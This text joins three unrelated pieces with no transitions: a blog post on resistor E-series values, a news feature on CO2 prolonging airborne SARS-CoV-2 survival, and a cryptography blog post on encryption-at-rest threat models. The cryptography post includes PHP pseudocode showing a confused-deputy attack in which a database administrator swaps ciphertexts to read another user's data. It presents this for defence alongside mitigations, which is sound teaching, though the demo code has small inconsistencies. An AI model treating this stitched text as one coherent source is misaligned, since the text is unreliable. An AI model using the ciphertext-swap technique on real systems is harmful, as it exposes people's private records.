<p><a href="https://digilent.com/blog/wp-content/uploads/2015/01/resistor-color-codes.png"><img fetchpriority="high" decoding="async" src="https://digilent.com/blog/wp-content/uploads/2015/01/resistor-color-codes-600x600.png" alt="resistor-color-codes" width="600" height="600" srcset="https://digilent.com/blog/wp-content/uploads/2015/01/resistor-color-codes.png 600w, https://digilent.com/blog/wp-content/uploads/2015/01/resistor-color-codes-150x150.png 150w, https://digilent.com/blog/wp-content/uploads/2015/01/resistor-color-codes-225x225.png 225w, https://digilent.com/blog/wp-content/uploads/2015/01/resistor-color-codes-300x300-cropped.png 300w" sizes="(max-width: 600px) 100vw, 600px"></a></p>
<p>We have to go back a few years to 1877 France. The French military used balloons for various purposes and of various sizes, and they had to be anchored using cables. Over time, they ended up with 425 different sizes of mooring cables that had to be individually ordered and inventoried. Talk about a nightmare.</p>
<p>Enter Charles Renard. He was tasked with improving the balloons, but discovered this rat’s nest of cables in the inventory closet instead. He spent some time thinking about it and came up with a series of 17 cable sizes that would allow for every type of balloon to be properly moored. Each size of cable had a max/min rating that just overlapped it’s neighbor above and below, so every required value was covered by one or more cable. This system of numbers became known as the “Renard numbers” and was later included in the&nbsp;“preferred numbers” when the concept was expanded for other applications and became an international standard with ISO (International Organization for Standards) 3 in 1952.</p>
<p>Since then, numerous international standards have been adopted by ISO for countless things, but one of those is how we identify&nbsp;certain electronic components. Using the same idea that Renard developed, these components are labeled with what are known as E-series values within the preferred number system. The lowest value is E6, which enumerates six&nbsp;values between&nbsp;two consecutive powers of 10, i.e., between 10 and 100 or between 10k and 100k. Starting with 10, we increase that value by roughly half and we get 15. Increase by roughly half again and we get 22. Continuing this trend, rounding as needed, and we end up with the series 10, 15, 22, 33, 47, and 68. Components built to the E6 standard have a 20% relative error tolerance, and if we look at the values again we’ll see a trend. Starting with 10 again and adding 20% error we end up with 12. Moving to 15 and subtracting 20% we get… wait for it… 12. Moving up from 15 we get 15 + 20% = 18 and 22 – 20% = 17.6. This trend repeats no matter what range of powers of 10 you use, as long as they are consecutive. So 47kΩ&nbsp;+ 20% = 56400, while 68kΩ – 20% = 54400.</p>
<p>Look again at the values 47 and 68. The max/min values overlap right about 56, don’t they? That sounds familiar. The E12 standard uses all of the same values as E6, but with 6 more values mixed in. These 6 additional values are roughly where the E6 values overlap, and now in order to cover the entire range our %-error is reduced to 10%. Starting again at 10, we have 10, 12, 15, 18, 22, 27, 33, 39, 47, 56, 68, and 82. The math holds true here as well, with the error values just slightly overlapping.</p>
<p>There are four&nbsp;more E-series as well, namely E24, E48, E96, and E192. The image above lists all values included in the E6/E12/E24 standards. With each doubling of&nbsp;values between consecutive powers of 10, there is an associated halving of the %-error allowance as well. So E24 values have a +/- %-error of 5%, E48 is set at 2%, and so on. The values associated with E192 are also available with 0.25% and 0.1% tolerances, and E24 and E96 are also available with 1% tolerances.</p>
<p>Below is a simple graphical view of how the E12 values relate to one another. Along the bottom of the graph you will see the first 13 terms&nbsp;of an ideal geometric sequence as well. (The sequence is given by y=10^(<em>i</em>/<em>b</em>), where <em>b</em> is the value of the series (e.g. 12) and <em>i</em> is the term desired (e.g. the 8th term would yield 10^(8/12)=4.64).) Notice how closely the values are related.</p>

<p>While it is possible to have a 3.3kΩ resistor with 20% tolerance test out between 2.64kΩ and 3.96kΩ, I would be hesitant to use it. I want 3.3kΩ, so I tend to use resistors with a higher tolerance, usually 5%, so I can just reach in my bin and know that I’m reasonably close. Looking back at the table in the beginning,&nbsp;we see that there are values of 68 and 75 listed. If I’m looking for a value of 70 (or some multiple power of 10, like 700), what can I do to achieve it? I can certainly start testing every 68 valued resistor I can find (75 is just out of range of 5% tolerance), hoping to find one that is just right, but just because it says 5%, doesn’t mean it is. That is a maximum allowance, and my experience has been that the tolerances are much tighter than that. I could go up to an E96 (681 0r 715) or even E192 (698!), but resistors with that level of %-error tolerance are not common and cost more. I just want something simple that I already have in my bin! The answer is actually quite simple. Just add a 33 and a 47 and call it good. You get your 70 +/- whatever tolerance you want since 33 and 47 are preferred numbers in every E-series. The point is that any value can be made for any circuit requirement simply by adding components together.

<div id="readability-page-1" class="page"><section>
	<p><span><span>C</span></span>arbon dioxide monitors have been around for decades. But in 2020, they became, almost overnight, a hot commodity. All of a sudden, people wanted them to help assess the safety of indoor spaces — to gauge the likelihood of breathing in coronavirus-laced particles that until very recently had been in someone else’s lungs.</p>
<p>No sensor can monitor how many infectious aerosols are swirling around us in real time. But carbon dioxide, or CO2, can act as a convenient proxy. People exhale it when they breathe, and in spaces that aren’t well ventilated, the gas accumulates. High CO2 concentrations can provide a warning sign that a lot of the air you’re inhaling is coming out of other people’s respiratory tracts.</p>
<p>For decades, that’s how aerosol scientists and ventilation engineers have mostly thought about CO2 — as a sort of indicator for the health of indoor environments. But over the last three years, researchers in the U.K. working with next-generation bioaerosol technologies have discovered that CO2 is more than a useful bystander. In fact, it plays a critical role in determining how long viruses can stay alive in the air: The more CO2 there is, the more virus-friendly the air becomes.</p>
<p>It’s a revelation that is already transforming the way scientists study airborne pathogens. But on a planet where burning fossil fuels and other industrial activities inject 37 billion metric tons of CO2 into the atmosphere each year, it could also have huge implications for human health.</p>
		
		
<p>“By increasing the CO2 in the air, we’re getting rid of a natural means by which viruses become inactivated,” said Allen Haddrell, an environmental chemist at the University of Bristol Aerosol Research Center, who led the new work. “It’s fascinating, but it’s also horrifying.”</p>
<p><span><span>H</span></span>addrell has spent his career designing instruments to better understand the complex chemical reactions that take place in the violent moments after someone coughs, sneezes, or breathes respiratory particles out. The reactions within those flecks determine how far they can float and how long they can linger in the air. In 2013, Haddrell was approached by the U.K.’s Defense Science and Technology Laboratory about making a machine to study how long bacteria can live inside these particles.</p>
<p>For the better part of a century, scientists have done those experiments with an instrument called a nebulizer, which creates a cloud of aerosols from liquids and releases them into a rotating drum. Then they wait and take time-stamped samples of the air inside the drum to calculate a given pathogen’s half-life: how long it can stay alive and aloft.</p>
<p>The trouble is, these nebulizers create complex plumes of particles, with different sizes and ages, so it can be difficult to know exactly what’s being measured. All the tumbling can give microbes a beating, too, making it difficult to interpret data about their viability. The British government’s military research arm wanted better information to help it prepare for a potential bioterrorism attack.</p>
<p>Making an instrument that could provide such information would turn into a six-year slog. Initially, Haddrell tried to adapt a technology known as “optical tweezers,” developed by a colleague of his at Bristol named Jonathan Reid. It uses lasers to trap particles in a microscope for extended periods of time, allowing researchers to measure the light scattering off of them to determine their physical and chemical properties. But bacteria — with all their proteins, fats, and other biomolecules — created patterns too complicated to fully understand.</p>
<p>Eventually, Haddrell, Reid, and a small team of Ph.D. students and postdocs turned to piezoelectronics. They could harness tiny charges of electricity to force fluid out under carefully controlled pressure, forming a perfect liquid bead — each with exactly the same chemical composition, size, and number of viral particles.</p>
<p>Instead of a rotating drum, Haddrell’s team built an electrodynamic force field to trap each tiny particle in mid-air at the moment of its creation. Using a laser and a camera, they could watch each hovering particle move and change as they exposed it to different environmental conditions. Once they’d measured the particles’ size and chemical composition, they could turn off the electrodynamic field, sending the beads plummeting into a Petri dish to be cultured.</p>
<p>The researchers called the contraption CELEBS, for “controlled electrodynamic levitation and extraction of bioaerosols onto a substrate,” and by 2019, they’d <a href="https://royalsocietypublishing.org/doi/10.1098/rsif.2018.0779" target="_blank" rel="noopener">shown it could work quite well</a> for benchmark bacteria like E. coli. The plan was to move on to other, more concerning airborne bacterial threats.</p>
<p>Then, a novel coronavirus emerged in China and began sickening millions of people all over the world.</p>
		
		
<p><span><span>O</span></span>n March 23, 2020, the same day Prime Minister Boris Johnson announced a nationwide lockdown to curb the widening outbreak of SARS-CoV-2, Haddrell got an email from a colleague at Bristol’s veterinary school, located on a farm about a 40-minute drive south. They were standing up a Containment Level 3 laboratory there and assembling a multidisciplinary rapid response team to study the virus. Could he get his CELEBS system working there, so they could learn more about how it behaved in respiratory particles?</p>
<p>“It was wild,” recalled Haddrell. “I went from thinking I would be home for the next three to six months to driving down there the next day.”</p>

<p>As the country shut down and the roads emptied of cars, Haddrell began building a high-containment version of his machine. While he did that, a postdoc named Henry Oswin took an existing CELEBS and got it calibrated to work with a mouse virus so they’d be ready to move on to SARS-CoV-2 as soon as the lab opened.</p>
<p>Around that time, researchers using traditional rotating drums began to report <a href="https://www.statnews.com/2020/03/16/coronavirus-can-become-aerosol-doesnt-mean-doomed/">the first survivability data for the new coronavirus</a>. One group, at the National Institute of Allergy and Infectious Diseases, found <a href="https://www.nejm.org/doi/10.1056/NEJMc2004973" target="_blank" rel="noopener">SARS-CoV-2 could stay viable in aerosols for up to three hours</a>. Another, from Tulane University, found it could live in the air for <a href="https://www.medrxiv.org/content/10.1101/2020.04.13.20063784v1" target="_blank" rel="noopener">over 16 hours</a>. The divergent findings added to the confusion as officials crafted public health policies in those first months of the pandemic — when Americans were encouraged first not to wear medical-grade masks, <a href="https://www.statnews.com/2020/04/03/white-house-urges-masks-coronavirus/">then to wear homemade cloth coverings</a>.</p>
<p>But when Haddrell’s team finally began their own experiments with SARS-CoV-2 in the fall of that year, they found the virus lost 90% of its ability to infect people within 20 minutes — with most of the loss occurring within the first five minutes.</p>
<p>Haddrell knew that going public with this information was going to be tricky. Because it had come from a totally novel technology, it would be easy to disregard the data as an artifact of an untested method. He wanted to make sure they had an explanation for why, in their hands, the coronavirus decayed much more quickly. So his team spent another year doing experiments and arguing over hypotheses on the daily drives to and from the new lab. Finally, they settled on a possible answer.</p>
<p>In biology labs, viruses are kept alive inside of cell cultures, where the byproducts of eating and growing can drive up the pH to dangerously alkaline levels. To keep that from happening, most culture media contains dissolved bicarbonate, which together with the carbon dioxide gas inside an incubator creates a buffering system.</p>
		
		
<p>Inside a nebulizer, though, these virus-laced bicarbonate solutions become aerosolized, releasing CO2 that builds up if it’s in a confined space. Haddrell’s team found that a standard nebulizer spraying cell culture media could raise the concentration of CO2 in a 7-liter box from 700 parts per million to over 1,100 over the course of 10 minutes. That extra CO2 acted like a buffer keeping the particles closer to a neutral pH, where respiratory viruses are quite content.</p>
<p>In the CELEBS system, that didn’t happen. As particles lost water through evaporation, they rapidly became more basic, which killed any SARS-CoV-2 viruses inside. Haddrell and his team proposed that pH, more than temperature and humidity, was the driving force behind viral decay in respiratory particles. And the method most widely used to study that had been incidentally altering pH without anyone realizing it.</p>
<p><span><span>I</span></span>f they were right, it would call into question decades of data produced by virology research groups around the world. So when Haddrell’s team posted their own results as <a href="https://www.medrxiv.org/content/10.1101/2022.01.08.22268944v1.full.pdf" target="_blank" rel="noopener">a preprint </a>in January 2022, they expected a bit of blowback. What they got was a hurricane.</p>
<p>“The headline is VERY convenient for people in power” tweeted Jose-Luis Jimenez, an atmospheric chemist at the University of Colorado, referencing <a href="https://www.theguardian.com/world/2022/jan/11/covid-loses-90-of-ability-to-infect-within-five-minutes-in-air-study" target="_blank" rel="noopener">a Guardian article about the research</a>. “Now they can quote an aerosol preprint to keep doing nothing… [Wonder if they’ll forget not reviewed?]” Other leading aerosol scientists <a href="https://twitter.com/jljcolorado/status/1480927297926479884" target="_blank" rel="noopener">quickly piled on</a>.</p>
<p>Haddrell, who wasn’t active on the social media site at the time, had unknowingly waded into a blistering online feud among researchers <a href="https://www.wired.com/story/the-teeny-tiny-scientific-screwup-that-helped-covid-kill/" target="_blank" rel="noopener">about the extent to which SARS-CoV-2 was airborne</a>. If it could travel through the air and infect people via inhalation, even over short distances, then social distancing and handwashing wasn’t going to be enough to curb its spread — masking and ventilation would also be required.</p>
<p>The controversy hinged on differences in how aerosol scientists and medical professionals used words like “aerosol” and “airborne,” <a href="https://www.statnews.com/2024/04/18/covid-airborne-transmission-disease-who-expanded-definition/#:~:text=Even%20as%20evidence%20grew%20that,was%20airborne%20until%20late%202021.">differences the World Health Organization only recently resolved</a>. But in 2022, many feared that at the precise time when the Delta variant was filling up hospital wards across the U.K. with Covid patients, Haddrell’s data would be wrongly interpreted as casting doubt on the airborne route of transmission.</p>
<p>“That’s not what we were saying at all,” Haddrell said. “When Fox News emailed us, we knew we had a problem,” he said.</p>
<p>So when his group used CELEBS to systematically tease apart all the fundamental processes that could be causing SARS-CoV-2 to die in respiratory particles — temperature, humidity, salt content — and still found that pH played the biggest role, they didn’t put out the results as a preprint before it was <a href="https://royalsocietypublishing.org/doi/10.1098/rsif.2023.0062" target="_blank" rel="noopener">published</a> last summer. He also took to X, formerly Twitter, to explain what this finding meant in practical, pandemic terms: “Anything that reduces the acid content of the air will lower the aerosolized viral load #ventilation,” he wrote.</p>
<p>That’s because the human body is not unlike those nebulizers. We, too, carry around dissolved CO2 in the form of bicarbonate, which our blood transports from all our remote tissues into our lungs. When we exhale, and the bicarbonate inside our respiratory particles comes into contact with the outside air, it quickly breaks down and escapes as CO2 gas. If we’re in an enclosed space, that CO2 sticks around, limiting how high the pH inside those particles can climb — just like inside the rotating drums.</p>
<p>But that still left the question: How much CO2 is necessary to boost the odds of viral survival? The <a href="https://www.nature.com/articles/s41467-024-47777-5" target="_blank" rel="noopener">latest paper</a> from Haddrell’s group, published in Nature Communications in April, found a disconcerting answer: not nearly as much as you might think. Increasing the CO2 concentration to just 800 parts per million, a level widely identified as being a marker of good ventilation, significantly extended the life spans of multiple SARS-CoV-2 variants. At higher concentrations — like those you might expect to find in a crowded, poorly ventilated room — Haddrell’s team found that 10 times as much virus remained infectious after 40 minutes when compared to clean air.</p>
		
		
<p><span><span>T</span></span>ogether, the papers make a case for the need to improve the quality of indoor air, said Josh Santarpia, an expert in aerosol transmission of disease at the University of Nebraska Medical Center who was not involved in the study. “It’s not just that your exposure is higher, but the risk is also higher because there are more things that are staying alive,” he said. “It demonstrates the compounded nature of poor ventilation.”</p>
<p>Jimenez, who had been critical of Haddrell’s 2022 preprint and the subsequent media coverage, described the Bristol group’s latest work as “very important” in the push for stronger policies that regulate indoor air. In March, he and a group of international experts <a href="https://www.science.org/doi/10.1126/science.adl0677" target="_blank" rel="noopener">writing in Science</a> presented a blueprint for national indoor air standards in public buildings, aiming to reduce both disease transmission and indoor pollutants.</p>
<p>In its call to action, the group proposed CO2 as one of three key metrics, suggesting ventilation rates that would keep CO2 levels at 800 parts per million or below. Lidia Morawska, an aerosol expert at Queensland University of Technology who was also an author on the Science perspective, told STAT that the Bristol work indicates that number might be too conservative.</p>
<p>“This is another argument for lowering the concentration of CO2 as much as we can,” Morawska said. “It’s moving from a role of being just a proxy to being understood as an enhancer, if we can use this term, for infection.”</p>
<p>Other aerosol experts who have studied SARS-CoV-2 extensively, like Linsey Marr at Virginia Tech, aren’t convinced that CO2 and pH are the whole story. “There are still many details we don’t understand about virus survival in respiratory particles,” she told STAT via email. “Their explanation might be right, but it might not.”</p>
<p>Haddrell agrees that more work needs to be done to understand how widely generalizable the phenomenon is. His team is now gearing up to begin more experiments with influenza A viruses.</p>
<p>But others are also taking up the reins. The Bristol group has now sent CELEBS machines to a handful of other labs, including Morawska’s in Australia and some in the U.S. With the recent spread of <a href="https://www.statnews.com/topic/h5n1-bird-flu/">H5N1 bird flu</a> into many mammal species, including dairy cattle and <a href="https://www.statnews.com/2024/05/30/bird-flu-third-case-human-infection-caused-respiratory-symptoms/">farmworkers who care for them</a>, and the continuing rise in atmospheric CO2 levels, understanding the complex interplay between viruses, human bodies, and the environments where they eat, sleep, and breathe, is only growing more urgent.</p>

<p>One of the lessons I learned during my time at AWS Cryptography (and particularly as an AWS Crypto Bar Raiser) is that the threat model for Encryption At Rest is often undefined.</p>



<p>Prior to consulting cryptography experts, most software developers do not have a clear and concise understanding of the risks they’re facing, let alone how or why the encrypting data at rest would help protect their customers.</p>



<p>Unsurprisingly, I’ve heard a few infosec thought leader types insist that encryption-at-rest is security theater over the years. I disagree with this assessment in the absolute terms, but there is a nugget of truth in that assertion.</p>

<p>Let’s explore this subject in a little more detail.</p>



<h2>Why should we listen to <em>you</em> about this topic?</h2>



<p>(If you don’t need any convincing, feel free to <a href="#protection">skip this section</a>.)</p>



<p>Encryption at rest is a particular hobby horse of mine. I previously wrote on this blog about <a href="https://scottarc.blog/2023/08/18/innovations-in-the-aws-database-encryption-sdk/">the under-celebrated design decisions in the AWS Database Encryption SDK</a> and <a href="https://scottarc.blog/2022/10/17/lucid-multi-key-deputies-require-commitment/">the need for key-committing AEAD modes in multi-tenant data lakes</a>.</p>



<p>Before my time at Amazon, I had also designed a PHP library called <a href="https://ciphersweet.paragonie.com/">CipherSweet</a> that offers a limited type of Searchable Encryption. The goal of CipherSweet was to improve the cryptography used by SuiteCRM. (The library name is, of course, a pun.)</p>



<p>I’ve also contributed a ton of time making cryptography easy-to-use and hard to misuse outside of the narrow use-case that is at-rest data encryption. To that end, I designed <a href="https://paseto.io/">PASETO</a> as a secure-by-default alternative to JSON Web Tokens.</p>



<p>I also have a lot of skin in the game when it comes to developer comprehension: I was the first Stack Overflow user with a gold badge for both <a href="https://stackoverflow.com/help/badges/1030/security" target="_blank" rel="noreferrer noopener">[security]</a> and <a href="https://stackoverflow.com/help/badges/4641/encryption" target="_blank" rel="noreferrer noopener">[encryption]</a>, largely due to the effort I put into cleaning up the <a href="https://meta.stackoverflow.com/questions/293930/problematic-php-cryptography-advice-in-popular-questions" target="_blank" rel="noreferrer noopener">bad cryptography advice for the PHP ecosystem</a>.</p>



<p>I have spent the past decade or so trying to help teams avoid <a href="https://paragonie.com/blog/2019/05/wordpress-5-2-mitigating-supply-chain-attacks-against-33-internet" target="_blank" rel="noreferrer noopener">security disasters in one form or another</a>. </p>



<h3>Why should we <strong>not</strong> listen to you about this topic?</h3>



<p>If you happen to know a cryptography expert you trust more than some Internet stranger with a blog, I implore you to listen to them if we disagree on any point. They may know something I don’t. (That said, I’m always happy to learn something new!)</p>



<p>I also do <strong>not</strong> have a college degree in Cryptography, nor have I published any papers in prestigious academic journals. If you care very much about this sort of pedigree, you will likely find my words easily discarded. If this describes your situation, no hard feelings.</p>



<h2 id="protection">Why and How to use Encryption At Rest to Protect Sensitive Data</h2>



<blockquote>
<p><strong>Important:</strong> I’m chiefly interested in discussing one use-case, and not focusing on other use cases. Namely, I’m focusing on encryption-at-rest in the narrow context of web applications and/or cloud services.</p>



<p>This is not a comprehensive blog post covering every possible use case or threat model relating to encryption at rest. Those other use cases are certainly interesting, but this post is already long enough with a narrower focus.</p>



<p>In particular: I’m not talking about the threats faced by activists or whistleblowers. This is a software engineering and applied cryptography focused blog post.</p>
</blockquote>



<p>If you’re only interested in compliance requirements, you can probably just enable Full Disk Encryption and call it a day. Then, if your server’s hard drive grows legs and walks out of the data center, your users’ most sensitive data will remain confidential.</p>



<p>Unfortunately, for the server-side encryption at rest use case, that’s basically all that Disk Encryption protects against.</p>



<p>If your application or database software is online and an attacker gains access to it (e.g., through SQL injection), with full disk encryption, <em>it might as well be plaintext</em> to an online attacker.</p>



<figure><img loading="lazy" data-attachment-id="607" data-permalink="https://scottarc.blog/2024/06/02/encryption-at-rest-whose-threat-model-is-it-anyway/full-disk-encryption/" data-orig-file="https://scottarc.blog/wp-content/uploads/2024/06/full-disk-encryption.jpg" data-orig-size="500,559" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="full-disk-encryption" data-image-description="" data-image-caption="" data-medium-file="https://scottarc.blog/wp-content/uploads/2024/06/full-disk-encryption.jpg?w=268" data-large-file="https://scottarc.blog/wp-content/uploads/2024/06/full-disk-encryption.jpg?w=500" width="500" height="559" src="https://scottarc.blog/wp-content/uploads/2024/06/full-disk-encryption.jpg?w=500" alt="Corporate needs you to find the differences between this picture and this picture. Picture 1: Full Disk Encryption. Picture 2: Plaintext Data. Attackers: They're the same picture."><figcaption>It do be like that.</figcaption></figure>



<p>Therefore, if you find yourself reaching for Encryption At Rest to mitigate the impact of the kind of vulnerability that would leak the contents of your database or filesystem to an attacker, you’re probably unwittingly engaging in security theater.</p>



<p>Disk Encryption is important for disk disposal and mitigating hardware theft, not preventing data leakage to online attackers.</p>



<p>So the next logical thing to do is draw a box around the system or component that stores a lot of data and never let plaintext cross that boundary.</p>



<h3>Client-Side Encryption</h3>



<p>Note: The naming here is a little imprecise. It <em>is</em> client-side encryption with respect to your data warehouse (i.e. SQL database), but not with respect to the user experience of a web application. In those cases, client-side would mean on the actual end user’s device.</p>



<p>Instead, client-side encryption is the generic buzz-word to mean that you’re encrypting data outside of the box you drew in your system architecture. Generally, this means that you have an application server that’s acting as the “client” for the purpose of bulk data encryption.</p>



<p>There are a lot of software projects that aim to provide client-side encryption for data stored in a database or filesystems; e.g., in Amazon S3 buckets.</p>



<p>This is a step in the right direction, but implementation details matter a lot.</p>



<blockquote>
<p><em>Quick aside:</em> For the remainder of this blog post, I’m going to assume an architecture that looks like a traditional web application, for simplicity.</p>



<p>The assumed architecture looks vaguely like this:</p>



<ul>
<li>User Agents (e.g., web browsers) that communicate with the application server.</li>



<li>Application Server(s) respond to HTTP requests from user agents, manages key material using KMS, encrypts / decrypts records stored in the database.</li>



<li>Database Server(s) which store ciphertext on behalf of the application server.</li>
</ul>



<p>This is an abstract design, so the actual implementation details you encounter in the real world may be simpler or more complex in different respects.</p>



<p>There are other interesting design considerations for OS-level end-user device encryption that I’m not going to explore today. For example: <a href="https://tosc.iacr.org/index.php/ToSC/article/view/7360">Adiantum</a> is extremely cool.</p>



<p>I’m also not going to dive deep into laptop theft or the importance of Full Disk Encryption as a mechanism for ensuring data is erased from solid state hard drives, or the activities of hostile nation states. That’s a separate discussion entirely.</p>
</blockquote>



<h2 id="security-considerations">Security Considerations for Client-Side Encryption</h2>



<p>The first question to answer when data is being encrypted is, “How are the keys being managed?” This is a very deep rabbit hole of complexity, but one good answer for a centralized service is, “Cloud-based key management service with audit logging”; i.e. AWS KMS, Google CloudKMS, etc.</p>



<p>We could talk about key management for a very long time, but there’s other things I want to focus on, so let’s revisit that in a future blog post.</p>



<p>Next, you have to understand how the data is being encrypted in the first place.</p>



<p><strong>Bad answer:</strong> <a href="https://robertheaton.com/2013/07/29/padding-oracle-attack/" target="_blank" rel="noreferrer noopener">AES in CBC mode without HMAC</a>.</p>



<p><strong>Worse answer:</strong> <a href="https://words.filippo.io/the-ecb-penguin/" target="_blank" rel="noreferrer noopener">AES in ECB mode</a>.</p>



<p>Generally, you’re going to want to use an AEAD construction, such as AES-GCM or XChaCha20-Poly1305.</p>



<p>You’ll also want <a href="https://scottarc.blog/2022/10/17/lucid-multi-key-deputies-require-commitment/">key-commitment</a> if you’re storing data for multiple customers in the same hardware. You can get this property by stapling HKDF onto your protocol (once for key derivation, again for commitment). See also: <a href="https://github.com/paseto-standard/paseto-spec/blob/master/docs/Rationale-V3-V4.md#better-use-of-hkdf-salts-change">PASETO v3 and v4</a>, or <a href="https://aws.amazon.com/blogs/security/improved-client-side-encryption-explicit-keyids-and-key-commitment/" target="_blank" rel="noreferrer noopener">Version 2 of the AWS Encryption SDK</a>.</p>



<p>It may be tempting to build a committing AEAD scheme out of, e.g., AES-CTR and HMAC, but take care that you don’t introduce canonicalization risks in your MAC.</p>



<h3>Is Your Deputy Confused?</h3>



<p>Even if you’re using IND-CCA secure encryption and managing your keys securely, there is still a very stupid attack against many data-at-rest encryption schemes.</p>



<p>To understand the attack, first consider this sort of scenario:</p>



<blockquote>
<p>Alice and Bob use the same health insurance provider, whom is storing sensitive medical records for both parties. Bob works as a database administrator for the insurance company he and Alice both use. One day, he decides to snoop on her private medical history.</p>



<p>Fortunately, the data is encrypted at the web application, so all of the data Bob can access is indistinguishable from random. He can access his own account and see his data through the application, but he cannot see Alice’s data from his vantage point on the database server.</p>
</blockquote>



<p>Here’s the stupid simple attack that works in far too many cases: Bob copies Alice’s encrypted data, and overwrites his records in the database, then accesses the insurance provider’s web app. </p>



<p><strong>Bam!</strong> Alice’s plaintext recovered.</p>



<p>What’s happening here is simple: The web application has the ability to decrypt different records encrypted with different keys. If you pass records that were encrypted for Alice to the application to decrypt it for Bob, and you’re <em>not authenticating your access patterns</em>, Bob can read Alice’s data by performing this attack.</p>



<p>The cryptographic attack is literally copy and paste, from the database administrator’s perspective. It’s stupid but <em>it works against too many encryption-at-rest software projects</em>.</p>



<p>In this setup, the application is the Deputy, and you can easily confuse it by replaying an encrypted blob in the incorrect context.</p>



<p>The mitigation is simple: Use the AAD mechanism (part of the standard AEAD interface) to bind a ciphertext to its context. This can be a customer ID, each row’s value for the primary key of the database table, or something else entirely.</p>



<p>If you’re using AWS KMS, you can also use <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/confused-deputy.html" target="_blank" rel="noreferrer noopener">Encryption Context for this exact purpose</a>.</p>



<h3>An Illustrative Example</h3>



<p>Let’s say you have a simple web application that encrypts data before storing it in a SQL database. </p>



<p>Let’s also write it to use AES-GCM, since unauthenticated CBC mode is awful.</p>



<p>A quick and dirty implementation might look like this:</p>


<div><pre title="">class User {
    public function __construct(
        public readonly string $username,
        public string $email,
        public string $fullName
    ) {}
}

class UserModel {
    public function __construct(protected Database $db)
    {}

    public function save(User $user): bool
    {
        return $this-&gt;db-&gt;upsert(
           'users', 
           [ // set
               'full_name' =&gt; aes128gcm_encrypt($user-&gt;fullName),
               'email' =&gt; aes128gcm_encrypt($user-&gt;email)
                       // encryption details abstracted
           ], 
           [ // where
               'username' =&gt; $user-&gt;username
           ]
        );
    }

    public function fetch(string $username): User
    {
        $row = $this-&gt;db-&gt;fetch('users', ['username' =&gt; $username]);
        return new User(
            $username,
            aes128gcm_decrypt($row['email']),
            aes128gcm_decrypt($row['full_name'])
        );
    }
}
</pre></div>


<p>For the abstracted <code>aes128gcm</code> functions in the pseudocode above, just assume they’re getting the key from KMS during encryption and storing an encrypted data key in a place the ciphertext can reference later on decrypt. I didn’t want to complicate the pseudocode with a lot of boilerplate.</p>



<p>You might decide to prove the confused deputy risk by doing something like this:</p>


<div><pre title="">$model = new UserModel($db);
$model-&gt;save(new User('alice', 'alice@example.com', 'Alice McWonderland'));
$model-&gt;save(new User('bob', 'bob@example.com', 'Bob BurgerMeister'));

// Fetch Alice's data
$aliceData = $db-&gt;fetch('users', ['username' =&gt; 'alice']);
$bobData = $db-&gt;fetch('users', ['username' =&gt; 'bob']);

// This is the attack the database server can perfrom:
// Replace Bob's full_name with Alice's email
$db-&gt;upsert('users', [
    'full_name' =&gt; $alice['email']
], ['username' =&gt; 'bob']);

$badBob = $model-&gt;fetch('bob');
</pre></div>


<p>Now Bob’s full name is set to Alice’s email address.</p>



<h3>The Curious Case of CipherSweet</h3>



<p>My knowledge of this risk didn’t manifest itself in a vacuum. It was discovered over the years of maintaining an open source library.</p>



<p>The first release of CipherSweet mitigated most of this risk by construction: Each field uses a different encryption key, through a key derivation scheme. </p>



<p>In <a href="https://scottarc.blog/wp-content/uploads/2024/06/pseudocode-py.jpg" target="_blank" rel="noreferrer noopener">pseudocode</a>:</p>


<div><pre title="">def encryptRow(self, records):
    for field, type in self.fieldsToEncrypt:
       key = self.getFieldSymmetricKey(self.table, field)
       records[field] = encryptField(key, field)
</pre></div>


<p>Since CipherSweet’s inception, if you try to replace Alice’s encrypted zip code with Alice’s encrypted social security number, the keys would be wrong, so it would lead to a decryption failure.</p>



<p><strong>Or so I thought!</strong></p>



<p>As I mentioned in my blog post about <a href="https://scottarc.blog/2022/10/17/lucid-multi-key-deputies-require-commitment/">multi-tenancy and confused deputy attacks</a>, if your AEAD mode doesn’t commit to the key used, it’s possible to craft a single (ciphertext, tag) that decrypts to two different plaintext values under two different keys.</p>



<p>CipherSweet’s <code>ModernCrypto</code> suite used XChaCha20-Poly1305, which is not key-committing, and therefore susceptible to this sort of misuse.</p>



<p>This violated the Principle of Least Astonishment and motivated the development of a new algorithm suite called <code>BoringCrypto</code>, which used BLAKE2b-MAC instead of Poly1305. This change was released <a href="https://github.com/paragonie/ciphersweet/releases/tag/v3.0.0">in version 3.0.0 in June 2021</a>. </p>



<p>However, even with <code>BoringCrypto</code> in 3.0.0, this only mitigated <em>most of </em> the issue by construction. The last mile of complexity here is that each field must also be bound to a primary key or foreign key.</p>



<p>Encrypting with AAD has been possible since a very early release of CipherSweet, but being possible to use securely is not sufficient. It should be <em>easy</em> to use securely.</p>



<p><a href="https://github.com/paragonie/ciphersweet/releases/tag/v4.7.0">CipherSweet Version 4.7.0</a>, which was released last month, now only requires a code change that looks like this in order to mitigate confused deputies in an application:</p>


<div><pre title="">  $multiRowEncryptor = new EncryptedMultiRows($engine);
  $multiRowEncryptor
+     -&gt;setAutoBindContext(true)
+     -&gt;setPrimaryKeyColumn('table2', 'id')
      -&gt;addTextField('table1', 'field1')
</pre></div>


<p>This is in addition to the new <a href="https://ciphersweet.paragonie.com/php/usage#enhanced-aad">Enhanced AAD</a> feature, which allows for flexible and powerful context binding based on other fields and/or string literals.</p>



<p>(In fact, this new convenience feature actually uses Enhanced AAD under-the-hood.)</p>



<p>This doesn’t come for free, however: Users have to know the serial / primary key for a record prior to writing it, in order to use it as AAD when encrypting fields. However, that’s a much easier pill to swallow than expecting PHP devs to manage the complexity of context-binding themselves.</p>



<p>As you can see, mitigating confused deputies in an encryption library (without making it unwieldy) requires a painstaking attention to detail to get right.</p>



<p>As Avi Douglen says, “Security at the cost of usability comes at the cost of security.”</p>



